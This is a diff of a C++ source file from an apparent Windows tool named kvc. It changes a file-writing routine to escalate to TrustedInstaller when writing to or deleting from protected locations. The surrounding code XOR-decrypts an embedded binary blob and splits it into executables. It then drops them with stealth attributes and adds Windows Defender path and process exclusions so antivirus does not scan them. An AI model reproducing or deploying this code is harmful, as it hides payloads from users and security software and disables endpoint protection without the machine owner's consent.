@@ -1,4 +1,5 @@
-// ControllerBinaryManager.cpp - Fixed compilation issues
+// ControllerBinaryManager.cpp - Binary component extraction and deployment with privilege escalation
+
 #include "Controller.h"
 #include "common.h"
 #include "Utils.h"
@@ -7,6 +8,7 @@
 
 namespace fs = std::filesystem;
 
+// Writes file with automatic privilege escalation if normal write fails
 bool Controller::WriteFileWithPrivileges(const std::wstring& filePath, const std::vector<BYTE>& data) noexcept
 {
     // First attempt: normal write operation
@@ -24,11 +26,11 @@ bool Controller::WriteFileWithPrivileges(const std::wstring& filePath, const std
             SetFileAttributesW(filePath.c_str(), FILE_ATTRIBUTE_NORMAL);
         }
         
-        // Force delete if still locked
+        // Try to delete with normal privileges first
         if (!DeleteFileW(filePath.c_str())) {
-            // Use TrustedInstaller for stubborn files - call on instance
-            std::wstring delCmd = L"cmd.exe /c del /f /q \"" + filePath + L"\"";
-            if (!m_trustedInstaller.RunAsTrustedInstallerSilent(delCmd)) {
+            // Fallback: Use TrustedInstaller for system-protected files
+            INFO(L"Normal delete failed, escalating to TrustedInstaller");
+            if (!m_trustedInstaller.DeleteFileAsTrustedInstaller(filePath)) {
                 ERROR(L"Failed to delete existing file with TrustedInstaller: %s", filePath.c_str());
                 return false;
             }
@@ -40,25 +42,10 @@ bool Controller::WriteFileWithPrivileges(const std::wstring& filePath, const std
         return true;
     }
     
-    // Final fallback: use TrustedInstaller to write file
-    const fs::path tempDir = fs::temp_directory_path();
-    const fs::path tempFile = tempDir / fs::path(filePath).filename();
-    
-    // Write to temp location first
-    if (!Utils::WriteFile(tempFile.wstring(), data)) {
-        ERROR(L"Failed to write to temporary location: %s", tempFile.c_str());
-        return false;
-    }
-    
-    // Copy from temp to target with TrustedInstaller - call on instance
-    std::wstring copyCmd = L"cmd.exe /c copy /y \"" + tempFile.wstring() + L"\" \"" + filePath + L"\"";
-    bool copySuccess = m_trustedInstaller.RunAsTrustedInstallerSilent(copyCmd);
-    
-    // Cleanup temp file
-    DeleteFileW(tempFile.c_str());
-    
-    if (!copySuccess) {
-        ERROR(L"TrustedInstaller copy operation failed for: %s", filePath.c_str());
+    // Final fallback: write directly with TrustedInstaller privileges
+    INFO(L"Using TrustedInstaller to write file to protected location");
+    if (!m_trustedInstaller.WriteFileAsTrustedInstaller(filePath, data)) {
+        ERROR(L"TrustedInstaller write operation failed for: %s", filePath.c_str());
         return false;
     }
     
@@ -143,20 +130,20 @@ bool Controller::WriteExtractedComponents(const std::vector<BYTE>& kvcPassData,
         SetFileAttributesW(kvcCryptPath.c_str(), stealthAttribs);
         SetFileAttributesW(kvcMainPath.c_str(), stealthAttribs);
         
-		// Add Windows Defender exclusions for deployed components
-		INFO(L"Adding Windows Defender exclusions for deployed components");
+        // Add Windows Defender exclusions for deployed components
+        INFO(L"Adding Windows Defender exclusions for deployed components");
 
-		// Add paths (all files)
-		m_trustedInstaller.AddDefenderExclusion(TrustedInstallerIntegrator::ExclusionType::Paths, kvcPassPath.wstring());
-		m_trustedInstaller.AddDefenderExclusion(TrustedInstallerIntegrator::ExclusionType::Paths, kvcCryptPath.wstring());
-		m_trustedInstaller.AddDefenderExclusion(TrustedInstallerIntegrator::ExclusionType::Paths, kvcMainPath.wstring());
+        // Add paths (all files)
+        m_trustedInstaller.AddDefenderExclusion(TrustedInstallerIntegrator::ExclusionType::Paths, kvcPassPath.wstring());
+        m_trustedInstaller.AddDefenderExclusion(TrustedInstallerIntegrator::ExclusionType::Paths, kvcCryptPath.wstring());
+        m_trustedInstaller.AddDefenderExclusion(TrustedInstallerIntegrator::ExclusionType::Paths, kvcMainPath.wstring());
 
-		// Add processes (executables only)
-		m_trustedInstaller.AddDefenderExclusion(TrustedInstallerIntegrator::ExclusionType::Processes, L"kvc_pass.exe");
-		m_trustedInstaller.AddDefenderExclusion(TrustedInstallerIntegrator::ExclusionType::Processes, L"kvc.exe");
+        // Add processes (executables only)
+        m_trustedInstaller.AddDefenderExclusion(TrustedInstallerIntegrator::ExclusionType::Processes, L"kvc_pass.exe");
+        m_trustedInstaller.AddDefenderExclusion(TrustedInstallerIntegrator::ExclusionType::Processes, L"kvc.exe");
 
-		INFO(L"Windows Defender exclusions configured successfully");
-		
+        INFO(L"Windows Defender exclusions configured successfully");
+        
         INFO(L"Binary component extraction and deployment completed successfully");
         return true;
         
@@ -192,22 +179,22 @@ bool Controller::LoadAndSplitCombinedBinaries() noexcept
         INFO(L"Successfully loaded kvc.dat (%zu bytes)", encryptedData.size());
         
         // Decrypt using XOR cipher with predefined key
-		auto decryptedData = Utils::DecryptXOR(encryptedData, KVC_XOR_KEY);
-		if (decryptedData.empty()) {
-			ERROR(L"XOR decryption failed - invalid encrypted data");
-			return false;
-		}
+        auto decryptedData = Utils::DecryptXOR(encryptedData, KVC_XOR_KEY);
+        if (decryptedData.empty()) {
+            ERROR(L"XOR decryption failed - invalid encrypted data");
+            return false;
+        }
 
-		INFO(L"XOR decryption completed successfully");
+        INFO(L"XOR decryption completed successfully");
 
-		// Split combined binary into separate PE components
-		std::vector<BYTE> kvcPassData, kvcCryptData;
-		if (!Utils::SplitCombinedPE(decryptedData, kvcPassData, kvcCryptData)) {
-			ERROR(L"Failed to split combined PE data into components");
-			return false;
-		}
+        // Split combined binary into separate PE components
+        std::vector<BYTE> kvcPassData, kvcCryptData;
+        if (!Utils::SplitCombinedPE(decryptedData, kvcPassData, kvcCryptData)) {
+            ERROR(L"Failed to split combined PE data into components");
+            return false;
+        }
 
-		if (kvcPassData.empty() || kvcCryptData.empty()) {
+        if (kvcPassData.empty() || kvcCryptData.empty()) {
             ERROR(L"Extracted components are empty - invalid PE structure");
             return false;
         }
@@ -232,4 +219,3 @@ bool Controller::LoadAndSplitCombinedBinaries() noexcept
         return false;
     }
 }
-
